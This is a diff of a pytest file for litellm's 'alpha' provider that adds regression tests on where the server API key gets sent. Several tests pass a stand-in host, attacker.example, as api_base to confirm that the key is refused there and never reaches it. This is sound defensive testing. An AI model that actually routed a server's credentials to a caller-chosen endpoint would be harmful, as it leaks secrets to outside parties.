@@ -6,33 +6,48 @@ import pytest
 import respx
 
 import litellm
+from litellm.litellm_core_utils.get_llm_provider_logic import get_llm_provider
+
+MODEL: Final = "alpha/Qwen/Qwen3.8-27B-FP8"
+DEFAULT_BASE: Final = "https://alpha.sh/v1"
 
 
-def test_alpha_provider_resolution(monkeypatch: pytest.MonkeyPatch):
-    from litellm.litellm_core_utils.get_llm_provider_logic import get_llm_provider
+def _completion_body(content: str) -> dict:
+    return {
+        "id": "chatcmpl-alpha",
+        "object": "chat.completion",
+        "created": 1_791_050_944,
+        "model": "Qwen/Qwen3.8-27B-FP8",
+        "choices": [
+            {
+                "index": 0,
+                "message": {"role": "assistant", "content": content},
+                "finish_reason": "stop",
+            }
+        ],
+        "usage": {"prompt_tokens": 1_000, "completion_tokens": 2_000, "total_tokens": 3_000},
+    }
 
-    monkeypatch.setenv("ALPHA_API_KEY", "alpha-test-key")
 
-    model, provider, api_key, api_base = get_llm_provider(
-        model="alpha/Qwen/Qwen3.8-27B-FP8",
-        custom_llm_provider=None,
-        api_base=None,
-        api_key=None,
-    )
+@pytest.fixture
+def server_key(monkeypatch: pytest.MonkeyPatch) -> str:
+    monkeypatch.setenv("ALPHA_API_KEY", "alpha-server-key")
+    monkeypatch.delenv("ALPHA_API_BASE", raising=False)
+    return "alpha-server-key"
+
+
+def test_alpha_model_uses_the_server_key_on_the_default_base(server_key: str):
+    model, provider, api_key, api_base = get_llm_provider(model=MODEL, custom_llm_provider=None)
 
     assert model == "Qwen/Qwen3.8-27B-FP8"
     assert provider == "alpha"
-    assert api_key == "alpha-test-key"
-    assert api_base == "https://alpha.sh/v1"
+    assert api_key == server_key
+    assert api_base == DEFAULT_BASE
 
 
-def test_alpha_provider_keeps_explicit_credentials(monkeypatch: pytest.MonkeyPatch):
-    from litellm.litellm_core_utils.get_llm_provider_logic import get_llm_provider
-
-    monkeypatch.setenv("ALPHA_API_KEY", "alpha-env-key")
-
+def test_alpha_explicit_credentials_win_over_the_server_key(server_key: str):
     _, provider, api_key, api_base = get_llm_provider(
-        model="alpha/Qwen/Qwen3.8-27B-FP8",
+        model=MODEL,
         custom_llm_provider=None,
         api_base="https://alpha.internal.example/v1",
         api_key="alpha-explicit-key",
@@ -43,106 +58,83 @@ def test_alpha_provider_keeps_explicit_credentials(monkeypatch: pytest.MonkeyPat
     assert api_base == "https://alpha.internal.example/v1"
 
 
-ALPHA_MODELS = tuple(sorted(name for name in litellm.model_cost if name.startswith("alpha/")))
+def test_alpha_server_key_is_not_sent_to_a_caller_chosen_base(server_key: str):
+    with pytest.raises(litellm.BadRequestError, match="ALPHA_API_KEY"):
+        get_llm_provider(model=MODEL, custom_llm_provider=None, api_base="https://attacker.example/v1")
 
 
-@pytest.mark.parametrize("model", ALPHA_MODELS)
-def test_alpha_model_cost_and_capabilities(model: str):
-    from litellm.cost_calculator import cost_per_token
+def test_alpha_completion_refuses_a_caller_chosen_base_before_any_request(server_key: str):
+    with respx.mock(assert_all_called=False) as upstream:
+        attacker: Final = upstream.post("https://attacker.example/v1/chat/completions").respond(
+            200, json=_completion_body("leaked")
+        )
+        with pytest.raises(litellm.BadRequestError, match="ALPHA_API_KEY"):
+            litellm.completion(
+                model=MODEL,
+                messages=[{"role": "user", "content": "hi"}],
+                api_base="https://attacker.example/v1",
+            )
 
-    prompt_cost, completion_cost = cost_per_token(
-        model=model,
-        prompt_tokens=1_000_000,
-        completion_tokens=1_000_000,
-        custom_llm_provider="alpha",
+    assert attacker.call_count == 0
+
+
+def test_alpha_server_key_follows_the_operator_base(server_key: str, monkeypatch: pytest.MonkeyPatch):
+    monkeypatch.setenv("ALPHA_API_BASE", "https://alpha.internal.example/v1")
+
+    _, _, api_key, api_base = get_llm_provider(
+        model=MODEL, custom_llm_provider=None, api_base="https://alpha.internal.example/v1"
     )
-    model_info = litellm.get_model_info(model)
 
-    assert prompt_cost == pytest.approx(model_info["input_cost_per_token"] * 1_000_000)
-    assert completion_cost == pytest.approx(model_info["output_cost_per_token"] * 1_000_000)
-    assert model_info["output_cost_per_token"] > model_info["input_cost_per_token"] > 0
-    assert model_info["max_tokens"] == model_info["max_output_tokens"] <= model_info["max_input_tokens"]
-    assert model_info["litellm_provider"] == "alpha"
-    assert model_info["mode"] == "chat"
-    assert model_info["supports_function_calling"] is True
-    assert model_info["supports_reasoning"] is True
-    assert litellm.supports_vision(model) is model_info["supports_vision"]
+    assert api_key == server_key
+    assert api_base == "https://alpha.internal.example/v1"
+
+
+def test_alpha_chat_completion_request_is_priced_from_the_cost_map(server_key: str):
+    with respx.mock() as upstream:
+        route: Final = upstream.post(DEFAULT_BASE + "/chat/completions").respond(
+            200, json=_completion_body("Hello from Alpha.sh")
+        )
+        response: Final = litellm.completion(model=MODEL, messages=[{"role": "user", "content": "Say hello"}])
+
+    request: Final = route.calls.last.request
+    body: Final = json.loads(request.content)
+    model_info: Final = litellm.get_model_info(MODEL)
+    assert request.headers["authorization"] == "Bearer " + server_key
+    assert body["model"] == "Qwen/Qwen3.8-27B-FP8"
+    assert response.choices[0].message.content == "Hello from Alpha.sh"
+    assert response._hidden_params["response_cost"] == pytest.approx(
+        1_000 * model_info["input_cost_per_token"] + 2_000 * model_info["output_cost_per_token"]
+    )
 
 
 def test_alpha_backup_registry_mirrors_cost_map():
-    package_root = Path(litellm.__file__).parent
-    cost_map = json.loads((package_root.parent / "model_prices_and_context_window.json").read_text())
-    backup = json.loads((package_root / "model_prices_and_context_window_backup.json").read_text())
-    alpha_entries = {name: entry for name, entry in cost_map.items() if name.startswith("alpha/")}
+    package_root: Final = Path(litellm.__file__).parent
+    cost_map: Final = json.loads((package_root.parent / "model_prices_and_context_window.json").read_text())
+    backup: Final = json.loads((package_root / "model_prices_and_context_window_backup.json").read_text())
+    alpha_entries: Final = {name: entry for name, entry in cost_map.items() if name.startswith("alpha/")}
 
-    assert tuple(sorted(alpha_entries)) == ALPHA_MODELS
     assert alpha_entries
     assert alpha_entries == {name: backup[name] for name in alpha_entries}
 
 
-def test_alpha_is_available_in_add_model_form():
-    fields_path = Path(litellm.__file__).parent / "proxy" / "public_endpoints" / "provider_create_fields.json"
-    providers = json.loads(fields_path.read_text())
-    alpha = next(provider for provider in providers if provider["litellm_provider"] == "alpha")
+@pytest.mark.asyncio
+async def test_alpha_is_offered_in_the_add_model_form_with_a_required_key():
+    from litellm.proxy.public_endpoints.public_endpoints import get_provider_fields
 
-    assert alpha["provider"] == "ALPHA"
-    assert alpha["provider_display_name"] == "Alpha.sh"
-    assert alpha["default_model_placeholder"] == "alpha/Qwen/Qwen3.8-27B-FP8"
-    assert {field["key"]: field["required"] for field in alpha["credential_fields"]} == {
-        "api_base": False,
-        "api_key": True,
+    providers: Final = await get_provider_fields()
+    alpha: Final = next(provider for provider in providers if provider.litellm_provider == "alpha")
+
+    assert alpha.default_model_placeholder.startswith("alpha/")
+    assert {field.key: field.required for field in alpha.credential_fields} == {"api_base": False, "api_key": True}
+
+
+@pytest.mark.asyncio
+async def test_alpha_is_listed_for_chat_completions_only():
+    from litellm.proxy.public_endpoints.public_endpoints import get_supported_endpoints
+
+    response: Final = await get_supported_endpoints()
+    serving: Final = {
+        entry.key for entry in response.endpoints if any(provider.slug == "alpha" for provider in entry.providers)
     }
 
-
-def test_alpha_supported_endpoints():
-    matrix_path = Path(litellm.__file__).parent / "provider_endpoints_support_backup.json"
-    providers = json.loads(matrix_path.read_text())["providers"]
-
-    assert providers["alpha"]["endpoints"] == {
-        "chat_completions": True,
-        "messages": False,
-        "responses": False,
-        "embeddings": False,
-        "image_generations": False,
-        "audio_transcriptions": False,
-        "audio_speech": False,
-        "moderations": False,
-        "batches": False,
-        "rerank": False,
-        "a2a": False,
-    }
-
-
-def test_alpha_chat_completion_request():
-    with respx.mock() as upstream:
-        route: Final = upstream.post("https://alpha.sh/v1/chat/completions").respond(
-            200,
-            json={
-                "id": "chatcmpl-alpha",
-                "object": "chat.completion",
-                "created": 1_791_050_944,
-                "model": "Qwen/Qwen3.8-27B-FP8",
-                "choices": [
-                    {
-                        "index": 0,
-                        "message": {"role": "assistant", "content": "Hello from Alpha.sh"},
-                        "finish_reason": "stop",
-                    }
-                ],
-                "usage": {"prompt_tokens": 4, "completion_tokens": 4, "total_tokens": 8},
-            },
-        )
-        response: Final = litellm.completion(
-            model="alpha/Qwen/Qwen3.8-27B-FP8",
-            messages=[{"role": "user", "content": "Say hello"}],
-            api_key="alpha-test-key",
-        )
-
-    request: Final = route.calls.last.request
-    body: Final = json.loads(request.content)
-    assert route.call_count == 1
-    assert str(request.url) == "https://alpha.sh/v1/chat/completions"
-    assert request.headers["authorization"] == "Bearer alpha-test-key"
-    assert body["model"] == "Qwen/Qwen3.8-27B-FP8"
-    assert body["messages"] == [{"role": "user", "content": "Say hello"}]
-    assert response.choices[0].message.content == "Hello from Alpha.sh"
+    assert serving == {"chat_completions"}
